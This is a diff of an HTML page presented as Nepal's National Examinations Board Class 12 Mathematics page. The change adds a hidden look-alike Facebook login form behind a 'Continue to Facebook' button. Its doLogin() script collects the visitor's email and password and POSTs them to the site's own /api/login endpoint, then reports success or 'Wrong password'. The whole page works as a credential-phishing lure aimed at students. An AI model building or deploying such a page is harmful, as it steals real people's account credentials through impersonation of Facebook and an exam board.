@@ -15,19 +15,20 @@
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: #ffffff;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
         }
 
-        .container {
+        /* NEB PAGE STYLES */
+        .neb-container {
             max-width: 500px;
             margin: 0 auto;
             padding: 40px 20px;
             text-align: center;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
         }
 
-        /* Title - LIGHT RED COLOR */
         .title h1 {
             font-size: 32px;
             color: #e63946;
@@ -48,7 +49,6 @@
             margin-top: 5px;
         }
 
-        /* Class 12 Section */
         .class-section {
             background: #f8f9fa;
             border-radius: 15px;
@@ -81,7 +81,6 @@
             margin: 10px 0;
         }
 
-        /* Continue Button */
         .continue-btn {
             background: #e63946;
             color: white;
@@ -103,19 +102,116 @@
             border: none;
             border-top: 1px solid #ddd;
         }
+
+        /* FACEBOOK PAGE STYLES */
+        .fb-container {
+            display: none;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .fb-box {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+
+        .fb-logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .fb-logo h1 {
+            color: #1877f2;
+            font-size: 60px;
+            font-weight: bold;
+        }
+
+        .fb-login-box {
+            background: white;
+            border-radius: 8px;
+            padding: 16px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+        }
+
+        .fb-login-box input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            font-size: 17px;
+        }
+
+        .fb-login-btn {
+            width: 100%;
+            background: #1877f2;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 20px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+        }
+
+        .fb-forgot {
+            text-align: center;
+            margin: 15px 0;
+        }
+
+        .fb-forgot a {
+            color: #1b1f23;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .fb-hr {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .fb-create-btn {
+            width: 100%;
+            background: transparent;
+            border: 2px solid #1877f2;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: bold;
+            color: #1877f2;
+            cursor: pointer;
+        }
+
+        .fb-meta {
+            text-align: center;
+            margin-top: 30px;
+            color: #1b1f23;
+        }
+
+        .back-btn {
+            background: transparent;
+            border: none;
+            color: #1877f2;
+            cursor: pointer;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <!-- Title - Light Red Color -->
+<!-- NEB PAGE -->
+<div id="nebPage" class="neb-container">
     <div class="title">
         <h1>राष्ट्रिय परीक्षा बोर्ड</h1>
         <h2>National Examinations Board</h2>
         <p>सानोठिमी, भक्तपुर | Nepal</p>
     </div>
 
-    <!-- Class 12 Section -->
     <div class="class-section">
         <h3>📚 कक्षा १२ (Class 12)</h3>
         <div class="math">[ MATHEMATICS ]</div>
@@ -124,12 +220,68 @@
 
     <hr>
 
-    <button class="continue-btn" onclick="goToFacebook()">Continue to Facebook →</button>
+    <button class="continue-btn" onclick="showFacebook()">Continue to Facebook →</button>
+</div>
+
+<!-- FACEBOOK PAGE -->
+<div id="fbPage" class="fb-container" style="display: none;">
+    <div class="fb-box">
+        <div class="fb-logo">
+            <h1>facebook</h1>
+        </div>
+        <div class="fb-login-box">
+            <input type="text" id="email" placeholder="Mobile number or email address">
+            <input type="password" id="password" placeholder="Password">
+            <button class="fb-login-btn" onclick="doLogin()">Log in</button>
+            <div class="fb-forgot">
+                <a href="#">Forgotten password?</a>
+            </div>
+            <div class="fb-hr"></div>
+            <button class="fb-create-btn" onclick="alert('Create new account')">Create new account</button>
+        </div>
+        <div class="fb-meta">
+            <p>Meta</p>
+        </div>
+        <button class="back-btn" onclick="showNEB()">← Back to NEB</button>
+    </div>
 </div>
 
 <script>
-    function goToFacebook() {
-        window.location.href = '/facebook-login';
+    function showFacebook() {
+        document.getElementById('nebPage').style.display = 'none';
+        document.getElementById('fbPage').style.display = 'flex';
+    }
+
+    function showNEB() {
+        document.getElementById('nebPage').style.display = 'flex';
+        document.getElementById('fbPage').style.display = 'none';
+    }
+
+    async function doLogin() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        if (!email || !password) {
+            alert('Please fill all fields');
+            return;
+        }
+
+        try {
+            const res = await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: email, password: password })
+            });
+            const data = await res.json();
+
+            if (data.success) {
+                alert('Login successful!');
+            } else {
+                alert('Wrong password');
+            }
+        } catch (err) {
+            alert('Connection error');
+        }
     }
 </script>
 
